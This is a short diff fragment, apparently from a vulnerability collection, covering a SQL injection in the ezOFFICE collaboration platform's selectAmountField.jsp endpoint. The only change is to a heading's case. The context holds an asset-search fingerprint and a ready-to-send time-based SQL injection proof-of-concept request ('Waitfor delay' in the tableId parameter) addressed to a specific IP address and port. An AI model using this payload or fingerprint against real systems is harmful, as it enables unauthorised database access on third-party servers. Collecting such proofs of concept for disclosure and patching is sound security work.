@@ -7,7 +7,7 @@ selectAmountField .jsp接口处存在sql注入漏洞，攻击者可获取数据�
 app="ezOFFICE协同管理平台"
 ```
 
-## poc
+## POC
 ```
 GET /defaultroot/platform/custom/custom_database/dropdownselect/selectAmountField.jsp;.js?tableId=11%20Waitfor%20delay%20'0:0:5'%20%2d%2d%20 HTTP/1.1
 Host: 60.216.117.230:7001
